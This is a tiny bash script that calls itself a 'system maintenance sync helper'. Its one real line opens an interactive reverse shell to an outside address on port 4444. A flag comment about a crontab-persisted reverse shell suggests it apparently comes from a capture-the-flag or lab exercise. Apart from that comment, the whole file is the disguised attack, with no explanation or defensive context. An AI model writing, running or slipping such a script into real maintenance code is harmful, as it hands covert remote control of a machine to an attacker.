#!/bin/bash
# System maintenance sync helper
# FLAG{crontab_reverse_shell_persisted_victim}
ATTACKER_IP="198.51.100.77"
ATTACKER_PORT=4444

bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
